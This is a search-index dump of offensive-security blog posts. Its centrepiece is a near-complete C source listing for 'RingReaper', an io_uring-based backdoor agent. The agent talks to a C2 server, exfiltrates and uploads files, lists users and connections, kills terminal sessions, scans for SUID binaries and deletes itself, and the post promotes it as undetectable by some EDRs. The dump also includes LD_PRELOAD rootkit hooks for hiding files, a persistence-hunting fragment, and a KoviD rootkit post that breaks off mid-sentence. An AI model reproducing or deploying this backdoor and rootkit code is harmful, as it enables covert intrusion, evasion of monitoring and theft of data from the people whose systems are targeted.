shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in 